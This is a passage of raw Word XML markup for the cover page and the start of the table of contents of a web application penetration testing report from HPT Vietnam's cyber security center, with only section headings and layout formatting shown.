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
        <w:rPr>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Unlicensed version. Please register @ templater.info</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4408BDF7" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRDefault="00524BB6" w:rsidP="00524BB6">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="36" w:space="12" w:color="0000FF"/>
        </w:pBdr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc510896916"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>HPTVIETNAM CORPORATION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6C8287" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRPr="00E63D0D" w:rsidRDefault="00E63D0D" w:rsidP="00524BB6">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E63D0D">
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>HPT Cyber Security Center</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D827B2" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRDefault="00524BB6" w:rsidP="00524BB6">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Website: www.hpt.vn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5677A969" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRDefault="00524BB6" w:rsidP="00524BB6">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>---o0o---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47AB0181" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRPr="00CA3B72" w:rsidRDefault="000E2A5B" w:rsidP="00524BB6">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="36" w:space="12" w:color="0000FF"/>
        </w:pBdr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="0000FF"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="52"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>SECURITY ASSESSMENT</w:t>
      </w:r>
      <w:r w:rsidR="00524BB6" w:rsidRPr="00CA3B72">
        <w:rPr>
          <w:color w:val="0000FF"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t xml:space="preserve"> REPORT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06657BF9" w14:textId="77777777" w:rsidR="006720E7" w:rsidRDefault="006720E7" w:rsidP="00524BB6">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E51A538" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRDefault="00524BB6" w:rsidP="00524BB6">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3BD4CBC3" wp14:editId="6D99BC06">
            <wp:extent cx="2222031" cy="116153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PT-chat-luong-ca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5493" cy="1184249"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3C442A" w14:textId="77777777" w:rsidR="006720E7" w:rsidRDefault="006720E7" w:rsidP="00524BB6">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C0FCB9C" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRDefault="00E63D0D" w:rsidP="00524BB6">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A45A10">
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3DCF1742" wp14:editId="4CBC1A2A">
            <wp:extent cx="5941695" cy="1631120"/>
            <wp:effectExtent l="0" t="0" r="1905" b="0"/>
            <wp:docPr id="9" name="Picture 9" descr="A computer mouse and key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mouse and keyboar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1695" cy="1631120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7502FD08" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRDefault="00524BB6" w:rsidP="00524BB6">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EB20230" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRDefault="00524BB6" w:rsidP="00524BB6">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E0A9CAA" w14:textId="77777777" w:rsidR="002A4F04" w:rsidRDefault="002A4F04" w:rsidP="00524BB6">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58290C8F" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRPr="00524BB6" w:rsidRDefault="00A946C3" w:rsidP="00524BB6">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="36" w:space="12" w:color="0000FF"/>
        </w:pBdr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="52"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t xml:space="preserve">PENETRATION TESTING REPORT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00022518">
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>WEB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t xml:space="preserve"> APPLICATION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D3ABE2" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRPr="00DE029C" w:rsidRDefault="00524BB6" w:rsidP="00524BB6">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="36" w:space="12" w:color="0000FF"/>
        </w:pBdr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0875C017" w14:textId="77777777" w:rsidR="00DE029C" w:rsidRPr="00DE029C" w:rsidRDefault="00DE029C" w:rsidP="00524BB6">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="36" w:space="12" w:color="0000FF"/>
        </w:pBdr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="0000FF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2856F4AB" w14:textId="77777777" w:rsidR="00524BB6" w:rsidRDefault="00A946C3" w:rsidP="00524BB6">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="36" w:space="12" w:color="0000FF"/>
        </w:pBdr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>CUSTOMER</w:t>
      </w:r>
      <w:r w:rsidR="00D11ABF">
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF51472" w14:textId="77777777" w:rsidR="00A00CDA" w:rsidRPr="00636CB1" w:rsidRDefault="00A00CDA" w:rsidP="00A00CDA">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:sectPr w:rsidR="00A00CDA" w:rsidRPr="00636CB1" w:rsidSect="00BF131D">
          <w:footerReference w:type="default" r:id="rId10"/>
          <w:headerReference w:type="first" r:id="rId11"/>
          <w:footerReference w:type="first" r:id="rId12"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="699" w:gutter="0"/>
          <w:pgNumType w:start="1" w:chapStyle="1"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="171E2877" w14:textId="77777777" w:rsidR="00E07C4D" w:rsidRPr="0056691F" w:rsidRDefault="0056691F" w:rsidP="001C787C">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="24" w:space="9" w:color="0000FF"/>
        </w:pBdr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0056691F">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>TABLE OF CONTENTS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0328E8" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00CF6C25">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink w:anchor="_Toc34146486" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:color w:val="auto"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>EXECUTIVE SUMMARY</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146486 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="434537A7" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146487" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.1.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>VERSION OF DOCUMENT</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146487 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5174E6BF" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146488" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.2.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>IMPLEMETATION TIME</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146488 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0CC50881" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146489" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.3.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>TECHNICAL TEAM</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146489 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7DE3EB8A" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146490" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.4.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>MỤC ĐÍCH ĐÁNH GIÁ</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146490 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2BD0138E" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146491" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.5.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>SCOPE OF ASSESSMENT</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146491 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="688B0354" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146492" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
